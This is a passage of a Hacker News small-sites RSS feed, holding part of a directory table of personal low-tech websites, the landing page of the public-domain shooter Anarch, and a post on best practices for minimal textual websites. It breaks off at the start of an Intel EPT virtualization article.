<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Blueberry Soft&quot;}">Blueberry Soft</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Hypermedia game-making framework&quot;}">Hypermedia game-making framework</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:25}">25</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;http://bwamp.org/&quot;}" data-sheets-hyperlink="http://bwamp.org/"><a href="http://bwamp.org/" target="_blank">http://bwamp.org/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Kyle Reimergartin&quot;}">Kyle Reimergartin</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;rooms of various size&quot;}">rooms of various size</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:26}">26</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;https://xenonfiber.space/&quot;}" data-sheets-hyperlink="https://xenonfiber.space/"><a href="https://xenonfiber.space/" target="_blank">https://xenonfiber.space/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Xenon Fiber\n&quot;}">Xenon Fiber</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Discography, blog, and independently hosted video streaming&quot;}">Discography, blog, and independently hosted video streaming</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:27}">27</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;https://alicee.neocities.org/&quot;}" data-sheets-hyperlink="https://alicee.neocities.org/"><a href="https://alicee.neocities.org/" target="_blank">https://alicee.neocities.org/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Stress-Repellent Machine&quot;}">Stress-Repellent Machine</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;video games, art and other dumb projek...god damn it i mean project!!!&quot;}">video games, art and other dumb projek...god damn it i mean project!!!</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:28}">28</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;https://frsp.xyz/&quot;}" data-sheets-hyperlink="https://frsp.xyz/"><a href="https://frsp.xyz/" target="_blank">https://frsp.xyz/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Frederick St. Peter&quot;}">Frederick St. Peter</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;experimental music and art&quot;}">experimental music and art</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:29}">29</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;https://l4nn1312.neocities.org/&quot;}" data-sheets-hyperlink="https://l4nn1312.neocities.org/"><a href="https://l4nn1312.neocities.org/" target="_blank">https://l4nn1312.neocities.org/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;L4NN-1312&quot;}">L4NN-1312</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;robot girl blog&quot;}">robot girl blog</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:30}">30</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;https://hyena.network/geocity/&quot;}" data-sheets-hyperlink="https://hyena.network/geocity/"><a href="https://hyena.network/geocity/" target="_blank">https://hyena.network/geocity/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Hyena Network (HyNET)&quot;}">Hyena Network (HyNET)</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;A network of: services, personal yelling into the void and hyenas.&quot;}">A network of: services, personal yelling into the void and hyenas.</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:31}">31</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;https://blog.knightsofthelambdacalcul.us/&quot;}" data-sheets-hyperlink="https://blog.knightsofthelambdacalcul.us/"><a href="https://blog.knightsofthelambdacalcul.us/" target="_blank">https://blog.knightsofthelambdacalcul.us/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;hazel&quot;}">hazel</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;tech rants and personal code hosting&quot;}">tech rants and personal code hosting</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:32}">32</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;https://www.lartu.net/&quot;}" data-sheets-hyperlink="https://www.lartu.net/"><a href="https://www.lartu.net/" target="_blank">https://www.lartu.net/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Lartu&quot;}">Lartu</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Personal server and open source repository&quot;}">Personal server and open source repository</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:33}">33</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;https://cometpustoj.neocities.org/&quot;}" data-sheets-hyperlink="https://cometpustoj.neocities.org/"><a href="https://cometpustoj.neocities.org/" target="_blank">https://cometpustoj.neocities.org/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Comet Pustój&quot;}">Comet Pustój</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;As I fly by your nebula, I write space poetry and send zines to earth.&quot;}">As I fly by your nebula, I write space poetry and send zines to earth.</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:34}">34</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;lata.neocities.org&quot;}" data-sheets-hyperlink="http://lata.neocities.org/"><a href="http://lata.neocities.org/" target="_blank">lata.neocities.org</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;lata&quot;}">lata</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;lata’s digital artworks&quot;}">lata’s digital artworks</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:35}">35</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;https://domushen.neocities.org/&quot;}" data-sheets-hyperlink="https://domushen.neocities.org/"><a href="https://domushen.neocities.org/" target="_blank">https://domushen.neocities.org/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;domushen&quot;}">domushen</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;rumored page of the elite cyber-lackey \&quot;\&quot;domushen\&quot;\&quot;&quot;}">rumored page of the elite cyber-lackey ""domushen""</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:36}">36</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;https://www.lander.blue/&quot;}" data-sheets-hyperlink="https://www.lander.blue/"><a href="https://www.lander.blue/" target="_blank">https://www.lander.blue/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;matt bluelander&quot;}">matt bluelander</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Toons, games, characters, download, store, e-mail&quot;}">Toons, games, characters, download, store, e-mail</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:37}">37</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;https://zassoken.com/Hakurikikomugiko/&quot;}" data-sheets-hyperlink="https://zassoken.com/Hakurikikomugiko/"><a href="https://zassoken.com/Hakurikikomugiko/" target="_blank">https://zassoken.com/Hakurikikomugiko/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Zassoken&quot;}">Zassoken</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Music collective based in Fukuoka, Japan&quot;}">Music collective based in Fukuoka, Japan</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:38}">38</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;https://dyremyhr.no&quot;}" data-sheets-hyperlink="https://dyremyhr.no/"><a href="https://dyremyhr.no/" target="_blank">https://dyremyhr.no</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Mats&quot;}">Mats</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;El Cybre $pace&quot;}">El Cybre $pace</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:39}">39</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;https://garakwasatailor.neocities.org/&quot;}" data-sheets-hyperlink="https://garakwasatailor.neocities.org/"><a href="https://garakwasatailor.neocities.org/" target="_blank">https://garakwasatailor.neocities.org/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Alexis Ong&quot;}">Alexis Ong</td>
<td>Writings on games, internet culture and tech.</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:40}">40</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;https://astoundingteam.com/wordpress/&quot;}" data-sheets-hyperlink="https://astoundingteam.com/wordpress/"><a href="https://astoundingteam.com/wordpress/" target="_blank">https://astoundingteam.com/wordpress/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;In Defense of Anagorism&quot;}">In Defense of Anagorism</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;blogging on political economy in the non-market, non-state sector&quot;}">blogging on political economy in the non-market, non-state sector</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:41}">41</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;http://everest-pipkin.com/&quot;}" data-sheets-hyperlink="http://everest-pipkin.com/"><a href="http://everest-pipkin.com/" target="_blank">http://everest-pipkin.com/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Everest Pipkin&quot;}">Everest Pipkin</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;a portfolio of games, experimental software, drawings, and other projects&quot;}">a portfolio of games, experimental software, drawings, and other projects</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:42}">42</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;https://emilyinternet.zone/&quot;}" data-sheets-hyperlink="https://emilyinternet.zone/"><a href="https://emilyinternet.zone/" target="_blank">https://emilyinternet.zone/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;emily&quot;}">emily</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;site for games, animation and legos!&quot;}">site for games, animation and legos!</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:43}">43</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;http://www.distinctly.pink/&quot;}" data-sheets-hyperlink="http://www.distinctly.pink/"><a href="http://www.distinctly.pink/" target="_blank">http://www.distinctly.pink/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;noah's home&quot;}">noah's home</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;all the things that noah did&quot;}">all the things that noah did</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:44}">44</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;https://e-vil.net/&quot;}" data-sheets-hyperlink="https://e-vil.net/"><a href="https://e-vil.net/" target="_blank">https://e-vil.net/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;J&quot;}">J</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;an evil homepage&quot;}">an evil homepage</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:45}">45</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;https://quartzosc-chip.neocities.org/&quot;}" data-sheets-hyperlink="https://quartzosc-chip.neocities.org/mainpage.html"><a href="https://quartzosc-chip.neocities.org/mainpage.html" target="_blank">https://quartzosc-chip.neocities.org/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;quartz&quot;}">quartz</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;cloudy music/personal blog, dna rain 4ever&quot;}">cloudy music/personal blog, dna rain 4ever</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:46}">46</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;http://tinybird.info/&quot;}" data-sheets-hyperlink="http://tinybird.info/"><a href="http://tinybird.info/" target="_blank">http://tinybird.info/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Max Bradbury&quot;}">Max Bradbury</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;creative works and musings on software, games, art and socialism&quot;}">creative works and musings on software, games, art and socialism</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:47}">47</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;https://metaparadox.neocities.org/&quot;}" data-sheets-hyperlink="https://metaparadox.neocities.org/"><a href="https://metaparadox.neocities.org/" target="_blank">https://metaparadox.neocities.org/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Olivia Montoya&quot;}">Olivia Montoya</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;A nostalgic website in the style of the mid-00s internet, with zines and indie games&quot;}">A nostalgic website in the style of the mid-00s internet, with zines and indie games</td>
</tr>
</div></div>]]>
            </description>
            <link>https://emreed.net/LowTech_Directory.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25194202</guid>
            <pubDate>Tue, 24 Nov 2020 01:29:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A fully public domain, highly portable first person shooter running on 32kb RAM]]>
            </title>
            <description>
<![CDATA[
Score 40 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25193953">thread link</a>) | @ClawsOnPaws
<br/>
November 23, 2020 | https://drummyfish.gitlab.io/anarch/ | <a href="https://web.archive.org/web/*/https://drummyfish.gitlab.io/anarch/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    <a href="https://drummyfish.gitlab.io/anarch"><img src="https://drummyfish.gitlab.io/anarch/media/logo_big.png" alt="logo"></a>

    <span><i>suckless, anticapitalist, public domain game for everyone</i></span>

    

    <span><a href="https://drummyfish.itch.io/anarch">itch.io</a></span>

    <dl>
      <dt> <a href="https://forum.freegamedev.net/viewtopic.php?f=22&amp;t=14771#p95387">Easily the most plain and boring FPS I've ever played.</a> </dt> <dd> Onpon4, libre game developer </dd>
      <dt> <a href="https://talk.pokitto.com/t/anarch-doom-clone-fps/2008/70">Technically the most impressive game on Pokito yet.</a> </dt> <dd> Jonne, the creator of Pokitto </dd>
      <dt> <a href="https://archive.li/tFWrL#84%">Kill yourself.</a> </dt> <dd> Anonymous on 4chan </dd>
    </dl>

    <span>THIS IS SPECIAL</span>

    <ul>
      <li>needs only <b>200 KB</b>, <b>32 KB RAM</b>, <b>40 MHz CPU</b>!</li>
      <li><b>suckless</b>, pure C, <b>no dependencies</b>, no FPU, GPU or file I/O needed</li>
      <li>10 levels, 6 weapons, 7 enemy types, 3 ammo types</li>
      <li>varying floor/ceiling oldschool SW ray casting engine with mouse support</li>
      <li><b>100% public domain</b> CC0 free software and culture</li>
      <li>100% original work, no third party assets</li>
      <li>well documented, hackable, <b>extremely portable</b></li>
      <li>completely <b>gratis</b>, without ads, DRM or similar bullshit</li>
    </ul>

    <p>
      This isn't a 90s style retro shooter, this <b>is</b> a 90s shooter.
    </p>

    <p>
      This game runs everywhere and adheres to great <a href="https://suckless.org/">simplicity</a>.
      It is much more efficient and portable than Doom and has completely
      <b>no dependencies</b>. Not even floating point is used, in case your
      computer doesn't have the HW unit. The game can fit into <b>200 KB</b>
      (including assets!) and can run with just <b>32 KB RAM</b>. No build system,
      library, internet connection or package manager is inherently required for
      compilation as the whole game is written in pure C language.
    </p>

    <p>
      This is an experiment and art that categorically rejects capitalist
      technology.
    </p>
 
   <img src="https://drummyfish.gitlab.io/anarch/media/3screens.png" alt="screenshots">

    <span>MORE THAN A GAME</span>

    <p>
      This is not a mere entertainment or toy meant for killing time or pursuing
      low goals such as making profit or something to put on portfolio, this is
      much more. Anarch is completely <b>gratis and free as in freedom</b> and
      besides entertainment can also be used for education, research, hacking, media
      creation, as a benchmark, as a test, as an environment, as an engine, as
      a basis for something greater. You are not limited by anything, there are
      no conditions to agree to. Nothing is hidden, everything is allowed, no
      burdens are imposed. The best motivation for creating anything is only
      the <b>pure love of creation for its own sake</b>, unburdened by any other
      goal than creating something truly useful. 
    </p>

    <img src="https://upload.wikimedia.org/wikipedia/commons/8/83/Anarch_Devices.jpg" alt="screenshots">

    <span>NO ONE OWNS THIS</span>

    <p>
      Not even I, the creator, own any part of this game.
      I&nbsp;have purposefully created everything myself from scratch,
      including the engine, graphics, sounds, music, even the font and palette,
      so that I could eventually give up all my rights and
      dedicate this game fully and <b>completely to the public domain</b>,
      to you, my dear fellow human being. No one should be allowed to own
      information and art.
    </p>

    <p>
      I've done my best to ensure this is 100% free as in freedom software and
      culture, well understandable and documented. This isn't made for any
      profit. This is made out of <b>love</b>, for you and for the greater good.
    </p>

    <h2>Download</h2>

    <ul>
      <li><a href="https://gitlab.com/drummyfish/anarch/-/raw/master/bin/Anarch_linux64_sdl_elf_1-0?inline=false">GNU/Linux SDL</a></li>
      <li><a href="https://gitlab.com/drummyfish/anarch/-/raw/master/bin/Anarch_LQ_linux64_sdl_elf_1-0?inline=false">GNU/Linux SDL LQ</a></li>
      <li><a href="https://drummyfish.gitlab.io/anarch/bin/web/anarch.html">play in browser</a></li>
      <li><a href="https://gitlab.com/drummyfish/anarch/-/raw/master/bin/Anarch_pokitto_1-0.pop?inline=false">Pokitto</a></li>
      <li><a href="https://gitlab.com/drummyfish/anarch/-/raw/master/bin/Anarch_gbmeta_1-0.zip?inline=false">GB Meta</a></li>
      <li><a href="https://gitlab.com/drummyfish/anarch/-/raw/master/bin/Anarch_winshitxp_sdl_1-0.zip?inline=false">M$ Win$hit XP SDL</a></li>
      <li><a href="https://gitlab.com/drummyfish/anarch/-/archive/master/anarch-master.zip">source code</a></li>
      <li><a href="https://gitlab.com/drummyfish/anarch/-/tree/master/bin">more downloads</a></li>
    </ul>

    <h2>Explore</h2>

    <ul>
      <li><a href="https://gitlab.com/drummyfish/sucklessfps">source code</a></li>
      <li><a href="https://www.tastyfish.cz/">author's website</a></li>
      <li><a href="https://libregamewiki.org/Anarch">libre game wiki</a></li>
      <li><a href="">OGA assets</a></li>
    </ul>

    <h2><a href="https://gitlab.com/drummyfish/anarch#faq">FAQ in readme</a></h2>

    

  

</div>]]>
            </description>
            <link>https://drummyfish.gitlab.io/anarch/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25193953</guid>
            <pubDate>Tue, 24 Nov 2020 00:56:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An opinionated list of best practices for textual websites]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25193874">thread link</a>) | @Seirdy
<br/>
November 23, 2020 | https://seirdy.one/2020/11/23/website-best-practices.html | <a href="https://web.archive.org/web/*/https://seirdy.one/2020/11/23/website-best-practices.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
	<p><em>The following applies to minimal websites that focus primarily on text. It does not
apply to websites that have a lot of non-textual content. It also does not apply to
websites that focus more on generating revenue or pleasing investors than being good
websites.</em></p>
<p>This is a “living document” that I add to as I receive feedback. See the
<a href="https://git.sr.ht/~seirdy/seirdy.one/log/master/content/posts/website-best-practices.md">changelog</a>.</p>
<p>I realize not everybody’s going to ditch the Web and switch to Gemini or Gopher today
(that’ll take, like, a month at the longest). Until that happens, here’s a
non-exhaustive, highly-opinionated list of best practices for websites that focus
primarily on text:</p>
<ul>
<li>Final page weight under 50kb without images, and under 200kb with images.</li>
<li>Works in Lynx, w3m, links (both graphics and text mode), Netsurf, and Dillo</li>
<li>Works with popular article-extractors (e.g.&nbsp;Readability) and HTML-to-Markdown
converters. This is a good way to verify that your site uses simple HTML and works
with most non-browser article readers (e.g.&nbsp;ebook converters, PDF exports).</li>
<li>No scripts or interactivity (preferably enforced at the CSP level)</li>
<li>No cookies</li>
<li>No animations</li>
<li>No fonts–local or remote–besides <code>sans-serif</code> and <code>monospace</code>. More on this
below.</li>
<li>No referrers</li>
<li>No requests after the page finishes loading</li>
<li>No 3rd-party resources (preferably enforced at the CSP level)</li>
<li>No lazy loading (more on this below)</li>
<li>No custom colors OR explicitly set the both foreground and background colors. More
on this below.</li>
<li>A maximum line length for readability</li>
<li>Server configured to support compression (gzip, optionally zstd as well). It’s a
free speed boost.</li>
<li>Supports dark mode via a CSS media feature and/or works with most “dark mode”
browser addons. More on this below.</li>
<li>A good score on Mozilla’s <a href="https://observatory.mozilla.org/">HTTP Observatory</a></li>
<li>Optimized images.</li>
<li>Maybe HTTP/2. There are some cases in which HTTP/2 can make things slower. Run some
tests to find out.</li>
</ul>
<p>I’d like to re-iterate yet another time that this only applies to websites that
primarily focus on text. If graphics, interactivity, etc. are an important part of
your website, less (possibly none) of this article applies.</p>
<p>Earlier revisions of this post generated some responses I thought I should address
below. Special thanks to the IRC and <a href="https://lobste.rs/s/akcw1m">Lobsters</a> users who
gave good feedback!</p>
<h2 id="about-fonts">About fonts</h2>
<p>If you <em>really</em> want, you could use <code>serif</code> instead of <code>sans-serif</code>, but serif fonts
tend to look worse on low-res monitors. Not every screen’s DPI has three digits.</p>
<p>To ship custom fonts is to assert that branding is more important than user choice.
That might very well be a reasonable thing to do; branding isn’t evil! It isn’t
<em>usually</em> the case for textual websites, though. Beyond basic layout and optionally
supporting dark mode, authors generally shouldn’t dictate the presentation of their
websites; that is the job of the user agent. Most websites are not important enough
to look completely different from the rest of the user’s system.</p>
<p>A personal example: I set my preferred fonts in my computer’s fontconfig settings.
Now every website that uses <code>sans-serif</code> will have my preferred font. Sites with
<code>sans-serif</code> blend into the users' systems instead of sticking out.</p>
<h3 id="but-most-users-dont-change-their-fonts">But most users don’t change their fonts…</h3>
<p>The “users don’t know better and need us to make decisions for them” mindset isn’t
without merits; however, in my opinion, it’s overused. Using system fonts doesn’t
make your website harder to use, but it does make it smaller and stick out less to
the subset of users who care enough about fonts to change them. This argument isn’t
about making software easier for non-technical users; it’s about branding by
asserting a personal preference.</p>
<h3 id="cant-users-globally-override-stylesheets-instead">Can’t users globally override stylesheets instead?</h3>
<p>It’s not a good idea to require users to automatically override website stylesheets.
Doing so would break websites that use fonts such as Font Awesome to display vector
icons. We shouldn’t have these users constantly battle with websites the same way
that many adblocking/script-blocking users (myself included) already do when there’s
a better option.</p>
<p>That being said, many users <em>do</em> actually override stylesheets. We shouldn’t
<em>require</em> them to do so, but we should keep our pages from breaking in case they do.
Pages following this article’s advice will probably work perfectly well in these
cases without any extra effort.</p>
<h3 id="but-wouldnt-that-allow-a-website-to-fingerprint-with-fonts">But wouldn’t that allow a website to fingerprint with fonts?</h3>
<p>I don’t know much about fingerprinting, except that you can’t do font enumeration
without JavaScript. Since text-based websites that follow these best-practices don’t
send requests after the page loads and have no scripts, fingerprinting via font
enumeration is a non-issue on those sites.</p>
<p>Other websites can still fingerprint via font enumeration using JavaScript. They
don’t need to stop at seeing what sans-serif maps to; they can see all the available
fonts on a user’s system, the user’s canvas fingerprint, window dimensions, etc. Some
of these can be mitigated with Firefox’s <code>privacy.resistFingerprinting</code> setting, but
that setting also understandably overrides user font preferences.</p>
<p>Ultimately, surveillance self-defense on the web is an arms race full of trade-offs.
If you want both privacy and customizability, the web is not the place to look; try
Gemini or Gopher instead.</p>
<h2 id="about-lazy-loading">About lazy loading</h2>
<p>For users on slow connections, lazy loading is often frustrating. I think I can speak
for some of these users: mobile data near my home has a number of “dead zones” with
abysmal download speeds, and my home’s Wi-Fi repeater setup occasionally results in
packet loss rates above 60% (!!).</p>
<p>Users on poor connections have better things to do than idly wait for pages to load.
They might open multiple links in background tabs to wait for them all to load at
once, or switch to another window/app and come back when loading finishes. They might
also open links while on a good connection before switching to a poor connection; I
know that I often open 10-20 links on Wi-Fi before going out for a walk in a
mobile-data dead-zone.</p>
<p>Unfortunately, pages with lazy loading don’t finish loading off-screen images in the
background. To load this content ahead of time, users need to switch to the loading
page and slowly scroll to the bottom to ensure that all the important content appears
on-screen and starts loading. Website owners shouldn’t expect users to have to jump
through these ridiculous hoops.</p>
<h3 id="wouldnt-this-be-solved-by-combining-lazy-loading-with-pre-loadingpre-fetching">Wouldn’t this be solved by combining lazy loading with pre-loading/pre-fetching?</h3>
<p>A large number of users with poor connections also have capped data, and would prefer
that pages don’t decide to predictively load content ahead-of-time for them. Some go
so far as to disable this behavior to avoid data overages. Savvy privacy-conscious
users also generally disable pre-loading because they don’t have reason to trust that
linked content doesn’t practice dark patterns like tracking without consent.</p>
<p>Users who click a link <em>choose</em> to load a full page. Loading pages that a user hasn’t
clicked on is making a choice for that user.</p>
<h3 id="cant-users-on-poor-connections-disable-images">Can’t users on poor connections disable images?</h3>
<p>I have two responses:</p>
<ol>
<li>If an image isn’t essential, you shouldn’t include it inline.</li>
<li>Yes, users could disable images. That’s <em>their</em> choice. If your page uses lazy
loading, you’ve effectively (and probably unintentionally) made that choice for a
large number of users.</li>
</ol>
<h2 id="about-custom-colors">About custom colors</h2>
<p>Some users' browsers set default page colors that aren’t black-on-white. For
instance, Linux users who enable GTK style overrides might default to having white
text on a dark background. Websites that explicitly set foreground colors but leave
the default background color (or vice-versa) end up being difficult to read. Here’s
an example:</p>
<picture>
<source srcset="https://seirdy.one/misc/website_colors.webp" type="image/webp">
<img src="https://seirdy.one/misc/website_colors.png" alt="This page with a grey background, a header with unreadable black/grey text, and unreadable white-on-white code snippets">
</picture>
<p>If you do explicitly set colors, please also include a dark theme using a media
query: <code>@media (prefers-color-scheme: dark)</code>. For more info, read the relevant docs
<a href="https://developer.mozilla.org/en-US/docs/Web/CSS/@media/prefers-color-scheme">on
MDN</a></p>
<h2 id="image-optimization">Image optimization</h2>
<p>Some image optimization tools I use:</p>
<ul>
<li><a href="http://pngquant.org/">pngquant</a> (lossy)</li>
<li><a href="https://github.com/shssoichiro/oxipng">Oxipng</a> (lossless)</li>
<li><a href="https://github.com/tjko/jpegoptim">jpegoptim</a> (lossless or lossy)</li>
<li><a href="https://developers.google.com/speed/webp/docs/cwebp">cwebp</a> (lossless or lossy)</li>
</ul>
<p>I put together a <a href="https://git.sr.ht/~seirdy/dotfiles/tree/3b722a843f3945a1bdf98672e09786f0213ec6f6/Executables/shell-scripts/bin/optimize-image">quick
script</a>
to losslessly optimize images using these programs in my dotfile repo.</p>
<p>You also might want to use the HTML <code>&lt;picture&gt;</code> element, using JPEG/PNG as a fallback
for more efficient formats such as WebP or AVIF. More info in the <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/picture">MDN
docs</a></p>
<p>Most of my images will probably be screenshots that start as PNGs. My typical flow:</p>
<ol>
<li>Lossy compression with <code>pngquant</code></li>
<li>Losslessly optimize the result with <code>oxipng</code> and its Zopfli backend (slow)</li>
<li>Also create a lossless WebP from the lossy PNG, using <code>cwebp</code></li>
<li>Include the resulting WebP in the page, with a fallback to the PNG using a <code>&lt;picture&gt;</code> element.</li>
</ol>
<p>It might seem odd to create a lossless WebP from a lossy PNG, but I’ve found that it’s the best way to get the smallest possible image at the minimum acceptable quality for screenshots with solid backgrounds.</p>
<h2 id="other-places-to-check-out">Other places to check out</h2>
<p>The <a href="https://250kb.club/">250kb club</a> gathers websites at or under 250kb, and also
rewards websites that have a high ratio of content size to total size.</p>
<p>Also see <a href="https://motherfuckingwebsite.com/">Motherfucking Website</a>. Motherfucking
Website inspired several unofficial sequels that tried to gently improve upon it. My
favorite is <a href="https://bestmotherfucking.website/">Best Motherfucking Website</a>.</p>
</article></div>]]>
            </description>
            <link>https://seirdy.one/2020/11/23/website-best-practices.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25193874</guid>
            <pubDate>Tue, 24 Nov 2020 00:45:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[MMU Virtualization via Intel EPT: Technical Details]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25193736">thread link</a>) | @todsacerdoti
<br/>
November 23, 2020 | https://revers.engineering/mmu-ept-technical-details/ | <a href="https://web.archive.org/web/*/https://revers.engineering/mmu-ept-technical-details/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <div>
          
            
            
          <h2>Overview</h2>
